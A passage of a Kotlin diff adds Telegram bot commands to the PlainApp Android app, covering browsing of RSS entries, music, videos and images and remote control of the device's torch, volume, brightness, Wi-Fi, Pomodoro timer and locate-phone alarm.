+                rows.add(listOf("${i + 1}. ${f.name.ifBlank { f.url }.take(28)}" to "feed_view:${f.id}"))
+            }
+            rows.add(listOf("📰 All recent entries" to "fe_view:__all__"))
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not load feeds: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun cmdFeedEntries(args: List<String>) {
+        sendTyping()
+        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
+        renderFeedEntriesPage("", 0, editMessageId = null, baseQuery = q)
+    }
+
+    private suspend fun renderFeedEntriesPage(feedId: String, offset: Int, editMessageId: Long?, baseQuery: String = "") {
+        if (feedId == "__add__") {
+            pendingInput = "feed_url"
+            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https). It must be a valid RSS or Atom feed.\nSend any /command to cancel."
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+            return
+        }
+        try {
+            val q = when {
+                feedId == "__all__" || feedId.isBlank() -> baseQuery
+                else -> {
+                    val extra = "feed_id:$feedId"
+                    if (baseQuery.isBlank()) extra else "$extra $baseQuery"
+                }
+            }
+            val pageSize = 10
+            val items = FeedEntryHelper.search(q, pageSize + 1, offset)
+            val hasMore = items.size > pageSize
+            val pageItems = items.take(pageSize)
+            val feedName = if (feedId.isNotBlank() && feedId != "__all__") {
+                FeedHelper.getById(feedId)?.name ?: "feed"
+            } else "All feeds"
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "📰 No entries in <b>${htmlEsc(feedName)}</b>." else "📰 No more entries."
+                val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("⬅️ Back to feeds" to "feeds_back")))
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
+                else sendMessage(msg, replyMarkup = markup)
+                return
+            }
+            val sb = StringBuilder("📰 <b>${htmlEsc(feedName)}</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap an entry to read.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, e ->
+                val mark = if (e.read) "✓" else "🔵"
+                sb.append("${offset + i + 1}. $mark <b>${htmlEsc(e.title.take(80))}</b>\n")
+                sb.append("   🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
+                if (e.author.isNotBlank()) sb.append("   ✍ ${htmlEsc(e.author.take(40))}\n")
+                sb.append("\n")
+                rows.add(listOf("${offset + i + 1}. ${e.title.take(30)}" to "fe_view:${e.id}"))
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            val fid = feedId.ifBlank { "_" }
+            if (offset > 0) nav.add("◀️ Prev" to "fe_pg:$fid:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "fe_pg:$fid:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            rows.add(listOf("⬅️ Back to feeds" to "feeds_back"))
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not load entries: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun renderFeedEntryDetail(id: String, editMessageId: Long?) {
+        if (id == "__add__") {
+            pendingInput = "feed_url"
+            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https).\nSend any /command to cancel."
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+            return
+        }
+        if (id == "__all__") { renderFeedEntriesPage("__all__", 0, editMessageId); return }
+        val e = FeedEntryHelper.getAsync(id)
+        if (e == null) {
+            val msg = "❌ Entry not found."
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+            return
+        }
+        // Mark as read
+        try { FeedEntryHelper.updateAsync(id) { read = true } } catch (_: Throwable) {}
+        val sb = StringBuilder()
+        sb.append("📰 <b>${htmlEsc(e.title)}</b>\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
+        if (e.author.isNotBlank()) sb.append("✍ ${htmlEsc(e.author)}\n")
+        sb.append("🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
+        if (e.url.isNotBlank()) sb.append("🔗 <a href=\"${htmlEsc(e.url)}\">Read original</a>\n")
+        sb.append("\n")
+        val body = e.content.ifBlank { e.description }.replace(Regex("<[^>]+>"), "").trim()
+        sb.append(htmlEsc(body.take(3500)))
+        if (body.length > 3500) sb.append("\n<i>… truncated</i>")
+        val rows = listOf(listOf("⬅️ Back" to "fe_back:${e.feedId}:0"))
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    // ---------------- Music / Videos / Images library ----------------
+
+    private suspend fun cmdMusic(args: List<String>) {
+        sendTyping()
+        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
+        renderMusicPage(q, 0, editMessageId = null)
+    }
+
+    private suspend fun renderMusicPage(query: String, offset: Int, editMessageId: Long?) {
+        try {
+            val pageSize = 10
+            val items = AudioMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
+            val hasMore = items.size > pageSize
+            val pageItems = items.take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "🎵 No audio tracks found." else "🎵 No more tracks."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("🎵 <b>Music</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a track to download.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, a ->
+                val mins = a.duration / 60; val secs = a.duration % 60
+                sb.append("${offset + i + 1}. 🎵 <b>${htmlEsc(a.title.take(60))}</b>\n")
+                if (a.artist.isNotBlank()) sb.append("   👤 ${htmlEsc(a.artist.take(50))}\n")
+                sb.append("   ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(a.size)}\n\n")
+                rows.add(listOf("📥 ${offset + i + 1}. ${a.title.take(28)}" to "mus_get:${pathToken(a.path)}"))
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            val qTok = safeSeg(query.ifBlank { "_" })
+            if (offset > 0) nav.add("◀️ Prev" to "mus_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "mus_pg:$qTok:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not read music: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun cbSendMediaAudio(path: String) {
+        val f = File(path)
+        if (!f.exists() || !f.isFile) { sendMessage("❌ Track gone: <code>${htmlEsc(path)}</code>"); return }
+        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
+        sendUploadDocument()
+        val ok = TelegramApiClient.sendAudio(token, chatId, f, "🎵 ${htmlEsc(f.name)}", 0)
+        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
+    }
+
+    private suspend fun cmdVideoLibrary(args: List<String>) {
+        sendTyping()
+        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
+        renderVideosPage(q, 0, editMessageId = null)
+    }
+
+    private suspend fun renderVideosPage(query: String, offset: Int, editMessageId: Long?) {
+        try {
+            val pageSize = 10
+            val items = VideoMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
+            val hasMore = items.size > pageSize
+            val pageItems = items.take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "🎞 No videos found." else "🎞 No more videos."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("🎞 <b>Videos</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a video to download.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, v ->
+                val mins = v.duration / 60; val secs = v.duration % 60
+                sb.append("${offset + i + 1}. 🎬 <b>${htmlEsc(v.title.take(60))}</b>\n")
+                sb.append("   📐 ${v.width}×${v.height}  ·  ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(v.size)}\n\n")
+                rows.add(listOf("📥 ${offset + i + 1}. ${v.title.take(28)}" to "vds_get:${pathToken(v.path)}"))
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            val qTok = safeSeg(query.ifBlank { "_" })
+            if (offset > 0) nav.add("◀️ Prev" to "vds_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "vds_pg:$qTok:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not read videos: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun cbSendMediaVideo(path: String) {
+        val f = File(path)
+        if (!f.exists() || !f.isFile) { sendMessage("❌ Video gone."); return }
+        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
+        sendUploadDocument()
+        val ok = TelegramApiClient.sendVideo(token, chatId, f, "🎬 ${htmlEsc(f.name)}", 0)
+        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
+    }
+
+    private suspend fun cmdImages(args: List<String>) {
+        sendTyping()
+        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
+        renderImagesPage(q, 0, editMessageId = null)
+    }
+
+    private suspend fun renderImagesPage(query: String, offset: Int, editMessageId: Long?) {
+        try {
+            val pageSize = 10
+            val items = ImageMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
+            val hasMore = items.size > pageSize
+            val pageItems = items.take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "🖼 No images found." else "🖼 No more images."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("🖼 <b>Gallery</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap to send the photo here.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, img ->
+                sb.append("${offset + i + 1}. 🖼 <b>${htmlEsc(img.title.take(60))}</b>\n")
+                sb.append("   📐 ${img.width}×${img.height}  ·  📦 ${humanSize(img.size)}\n")
+                sb.append("   🕐 ${fmtTime(img.createdAt.toEpochMilliseconds())}\n\n")
+                rows.add(listOf("📥 ${offset + i + 1}. ${img.title.take(28)}" to "img_get:${pathToken(img.path)}"))
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            val qTok = safeSeg(query.ifBlank { "_" })
+            if (offset > 0) nav.add("◀️ Prev" to "img_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "img_pg:$qTok:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not read images: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    private suspend fun cbSendMediaImage(path: String) {
+        val f = File(path)
+        if (!f.exists() || !f.isFile) { sendMessage("❌ Image gone."); return }
+        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
+        sendUploadPhoto()
+        val ok = TelegramApiClient.sendPhoto(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
+        if (!ok) {
+            // Photo can fail for huge images; fall back to document.
+            val ok2 = TelegramApiClient.sendDocument(token, chatId, f, "🖼 ${htmlEsc(f.name)}")
+            if (!ok2) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
+        }
+    }
+
+    // ---------------- Pomodoro ----------------
+
+    private suspend fun cmdPomodoro(args: List<String>) {
+        val sub = args.firstOrNull()?.lowercase()
+        when (sub) {
+            "start", "go" -> {
+                val secs = try { PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60 } catch (_: Throwable) { 25 * 60 }
+                sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
+                renderPomodoroStatus(editMessageId = null)
+            }
+            "pause" -> { sendEvent(HttpApiEvents.PomodoroPauseEvent()); renderPomodoroStatus(editMessageId = null) }
+            "stop", "reset" -> { sendEvent(HttpApiEvents.PomodoroStopEvent()); renderPomodoroStatus(editMessageId = null) }
+            else -> renderPomodoroStatus(editMessageId = null)
+        }
+    }
+
+    private suspend fun renderPomodoroStatus(editMessageId: Long?) {
+        try {
+            val settings = PomodoroSettingsPreference.getValueAsync(MainApp.instance)
+            val today = kotlinx.datetime.Clock.System.now()
+                .toLocalDateTime(kotlinx.datetime.TimeZone.currentSystemDefault()).date.toString()
+            val dao = com.ismartcoding.plain.db.AppDatabase.instance.pomodoroItemDao()
+            val rec = try { dao.getByDate(today) } catch (_: Throwable) { null }
+            val completed = rec?.completedCount ?: 0
+            val sb = StringBuilder("🍅 <b>Pomodoro</b>\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
+            sb.append("📅 Today: <b>$today</b>\n")
+            sb.append("✅ Completed: <b>$completed</b> sessions\n")
+            sb.append("⏱ Work: ${settings.workDuration} min  ·  Short break: ${settings.shortBreakDuration} min  ·  Long break: ${settings.longBreakDuration} min\n")
+            sb.append("🔁 Long break every: ${settings.pomodorosBeforeLongBreak} sessions\n\n")
+            sb.append("<i>Tap below to control the timer on the device.</i>")
+            val rows = listOf(
+                listOf("▶️ Start" to "pom_start", "⏸ Pause" to "pom_pause"),
+                listOf("⏹ Stop" to "pom_stop", "🔄 Refresh" to "pom_refresh"),
+            )
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Pomodoro error: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    // ---------------- Torch ----------------
+
+    private suspend fun cmdTorch(args: List<String>) {
+        val sub = args.firstOrNull()?.lowercase()
+        try {
+            when (sub) {
+                "on", "1", "true" -> UtilitiesHelper.setTorch(true)
+                "off", "0", "false" -> UtilitiesHelper.setTorch(false)
+                "toggle" -> UtilitiesHelper.setTorch(!UtilitiesHelper.isTorchOn())
+                null, "" -> { /* just show state */ }
+                else -> { sendMessage("Usage: /torch [on|off|toggle]"); return }
+            }
+        } catch (e: Exception) {
+            sendMessage("❌ Torch failed: ${htmlEsc(e.message ?: "")}")
+            return
+        }
+        renderTorchState(editMessageId = null)
+    }
+
+    private suspend fun renderTorchState(editMessageId: Long?) {
+        val on = try { UtilitiesHelper.isTorchOn() } catch (_: Throwable) { false }
+        val sb = StringBuilder("🔦 <b>Flashlight</b>\n━━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("State: <b>${if (on) "🟢 ON" else "⚪ OFF"}</b>")
+        val rows = listOf(listOf("🔦 ON" to "torch_on", "⚪ OFF" to "torch_off"))
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    // ---------------- Speak / Vibrate / Show / Wake ----------------
+
+    private suspend fun cmdSpeak(text: String) {
+        val say = text.trim()
+        if (say.isEmpty()) {
+            pendingInput = "speak_text"
+            sendMessage("🗣 <b>Text-to-speech</b>\n\nReply with the text to speak on the device.\nSend any /command to cancel.")
+            return
+        }
+        UtilitiesHelper.speak(say)
+        sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
+    }
+
+    private suspend fun cmdVibrate(args: List<String>) {
+        val secs = args.firstOrNull()?.toIntOrNull() ?: 1
+        val ms = (secs.coerceIn(1, 10)) * 1000L
+        UtilitiesHelper.vibrate(ms)
+        sendMessage("📳 Vibrating for ${ms / 1000}s")
+    }
+
+    private suspend fun cmdFindPhone(args: List<String>) {
+        when (args.firstOrNull()?.lowercase()) {
+            "on", "start" -> { LocateRingService.start(); renderFindPhoneState(editMessageId = null) }
+            "off", "stop" -> { LocateRingService.stop(); renderFindPhoneState(editMessageId = null) }
+            else -> renderFindPhoneState(editMessageId = null)
+        }
+    }
+
+    private suspend fun renderFindPhoneState(editMessageId: Long?) {
+        val running = LocateRingService.running
+        val sb = StringBuilder("🚨 <b>Locate phone</b>\n━━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("State: <b>${if (running) "🚨 RINGING" else "🔕 OFF"}</b>\n\n")
+        sb.append("<i>The device will play a loud alarm sound at full volume to help you find it.</i>")
+        val rows = listOf(listOf("🚨 Start alarm" to "fp_on", "🔕 Stop" to "fp_off"))
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    private suspend fun cmdShow(text: String) {
+        val msg = text.trim()
+        if (msg.isEmpty()) {
+            pendingInput = "show_text"
+            sendMessage("💡 <b>Show banner on device</b>\n\nReply with the message to show as a screen overlay.\nSend any /command to cancel.")
+            return
+        }
+        if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
+            sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
+            return
+        }
+        MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
+        sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
+    }
+
+    private suspend fun cmdWake(args: List<String>) {
+        val secs = (args.firstOrNull()?.toIntOrNull() ?: 10).coerceIn(1, 120)
+        UtilitiesHelper.wakeScreen(secs * 1000L)
+        sendMessage("📺 Screen woken for ${secs}s.")
+    }
+
+    // ---------------- Brightness / Volume ----------------
+
+    private suspend fun cmdBrightness(args: List<String>) {
+        val pct = args.firstOrNull()?.toIntOrNull()
+        if (pct == null) { renderBrightnessState(editMessageId = null); return }
+        val ok = UtilitiesHelper.setBrightness(pct.coerceIn(0, 100))
+        if (!ok) { sendMessage("⛔ WRITE_SETTINGS permission not granted. Enable it for PlainApp first."); return }
+        renderBrightnessState(editMessageId = null)
+    }
+
+    private suspend fun renderBrightnessState(editMessageId: Long?) {
+        val cur = try { UtilitiesHelper.getBrightness() } catch (_: Throwable) { 0 }
+        val sb = StringBuilder("🔆 <b>Brightness</b>\n━━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("Current: <b>${cur}%</b>\n\n<i>Tap a preset to change.</i>")
+        val rows = listOf(
+            listOf("0%" to "br_set:0", "25%" to "br_set:25", "50%" to "br_set:50"),
+            listOf("75%" to "br_set:75", "100%" to "br_set:100"),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    private suspend fun cmdVolume(args: List<String>) {
+        val a0 = args.getOrNull(0)?.lowercase()
+        val a1 = args.getOrNull(1)?.toIntOrNull()
+        if (a0 != null && a1 != null) {
+            UtilitiesHelper.setVolume(a0, a1.coerceIn(0, 100))
+        } else if (a0 != null && args.size == 1 && a0.toIntOrNull() != null) {
+            UtilitiesHelper.setVolume("media", a0.toInt().coerceIn(0, 100))
+        }
+        renderVolumeState(editMessageId = null)
+    }
+
+    private suspend fun renderVolumeState(editMessageId: Long?) {
+        val v = try { UtilitiesHelper.getVolumes() } catch (_: Throwable) { emptyMap() }
+        val sb = StringBuilder("🔊 <b>Volume Levels</b>\n━━━━━━━━━━━━━━━━━━━━\n")
+        v.forEach { (k, p) -> sb.append("• <b>$k</b>: ${p}%\n") }
+        sb.append("\n<i>Tap a preset to change media volume.</i>")
+        val rows = listOf(
+            listOf("🔇 0%" to "vol_set:media:0", "25%" to "vol_set:media:25", "50%" to "vol_set:media:50"),
+            listOf("75%" to "vol_set:media:75", "🔊 100%" to "vol_set:media:100"),
+            listOf("📞 Ring 50%" to "vol_set:ring:50", "🔔 Notif 50%" to "vol_set:notification:50"),
+        )
+        val markup = TelegramApiClient.inlineKeyboard(rows)
+        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+        else sendMessage(sb.toString(), replyMarkup = markup)
+    }
+
+    // ---------------- Launch app ----------------
+
+    private suspend fun cmdLaunch(args: List<String>) {
+        if (args.isEmpty()) { renderLaunchAppsPage("", 0, editMessageId = null); return }
+        val arg = args.joinToString(" ")
+        // Direct launch if it looks like a package name
+        if (arg.contains('.') && !arg.contains(' ')) {
+            val ok = AppLauncherHelper.launch(arg)
+            if (ok) { sendMessage("🚀 Launched <code>${htmlEsc(arg)}</code> on the device."); return }
+        }
+        renderLaunchAppsPage(arg.lowercase(), 0, editMessageId = null)
+    }
+
+    private suspend fun renderLaunchAppsPage(query: String, offset: Int, editMessageId: Long?) {
+        try {
+            val all = AppLauncherHelper.list(MainApp.instance, query).filter { it.launchable }
+            val pageSize = 10
+            val pageItems = all.drop(offset).take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "🚀 No launchable apps match <code>${htmlEsc(query)}</code>" else "🚀 No more apps."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("🚀 <b>Launch app</b> · ${offset + 1}–${offset + pageItems.size} of ${all.size}\n<i>Tap an app to open it on the device.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, a ->
+                sb.append("${offset + i + 1}. 📱 <b>${htmlEsc(a.label)}</b>\n   <code>${htmlEsc(a.packageName)}</code>\n\n")
+                rows.add(listOf("${offset + i + 1}. ${a.label.take(34)}" to "lrun:${pkgToken(a.packageName)}"))
+            }
+            val nav = mutableListOf<Pair<String, String>>()
+            val qTok = safeSeg(query.ifBlank { "_" })
+            if (offset > 0) nav.add("◀️ Prev" to "lpg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
+            if (offset + pageSize < all.size) nav.add("Next ▶️" to "lpg:$qTok:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    // ---------------- Wi-Fi ----------------
+
+    private suspend fun cmdWifi(args: List<String>) {
+        when (args.firstOrNull()?.lowercase()) {
+            "on", "1", "true" -> WifiControlHelper.setWifiEnabled(true, MainApp.instance)
+            "off", "0", "false" -> WifiControlHelper.setWifiEnabled(false, MainApp.instance)
+            else -> { /* show state */ }
+        }
+        renderWifiState(editMessageId = null)
+    }
+
+    private suspend fun renderWifiState(editMessageId: Long?) {
+        try {
+            val s = WifiControlHelper.state(MainApp.instance)
+            val sb = StringBuilder("📶 <b>Wi-Fi</b>\n━━━━━━━━━━━━━━━━━━━━\n")
+            sb.append("State: <b>${if (s.enabled) "🟢 ON" else "⚪ OFF"}</b>\n")
+            if (s.enabled) {
+                if (s.connectedSsid.isNotBlank()) sb.append("Network: <b>${htmlEsc(s.connectedSsid)}</b>\n")
+                if (s.ipv4.isNotBlank()) sb.append("IP: <code>${s.ipv4}</code>\n")
+                if (s.linkSpeedMbps > 0) sb.append("Speed: ${s.linkSpeedMbps} Mbps\n")
+                if (s.rssi > -127) sb.append("Signal: ${s.rssi} dBm\n")
+                if (s.frequencyMhz > 0) sb.append("Freq: ${s.frequencyMhz} MHz\n")
+            }
+            sb.append("Hotspot: ${s.hotspotState}\n")
+            val rows = listOf(listOf("🟢 Turn ON" to "wifi_on", "⚪ Turn OFF" to "wifi_off"))
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Wi-Fi error: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    // ---------------- Network usage ----------------
+
+    private suspend fun cmdNetUsage(args: List<String>) {
+        val days = (args.firstOrNull()?.toIntOrNull() ?: 7).coerceIn(1, 90)
+        sendTyping()
+        try {
+            if (!NetworkUsageHelper.usageAccessGranted(MainApp.instance)) {
+                sendMessage("⛔ Network usage requires the <b>Usage Access</b> permission.\nGrant it for PlainApp in Android Settings → Special Access → Usage Access.")
+                return
+            }
+            val w = NetworkUsageHelper.query(days, MainApp.instance)
+            val sb = StringBuilder("📊 <b>Network usage</b> · last $days day(s)\n━━━━━━━━━━━━━━━━━━━━\n")
+            sb.append("📥 Total RX: <b>${humanSize(w.totalRx)}</b>\n")
+            sb.append("📤 Total TX: <b>${humanSize(w.totalTx)}</b>\n\n")
+            sb.append("<b>Top apps:</b>\n")
+            w.items.take(15).forEachIndexed { i, app ->
+                sb.append("${i + 1}. <b>${htmlEsc(app.label.take(30))}</b>  ·  ${humanSize(app.rxBytes + app.txBytes)}\n")
+                sb.append("   📶 Wi-Fi ${humanSize(app.rxBytesWifi + app.txBytesWifi)}  ·  📡 Mobile ${humanSize(app.rxBytesMobile + app.txBytesMobile)}\n")
+            }
+            sendMessage(sb.toString())
+        } catch (e: Exception) {
+            sendMessage("❌ Net usage error: ${htmlEsc(e.message ?: "")}")
         }
     }
 }
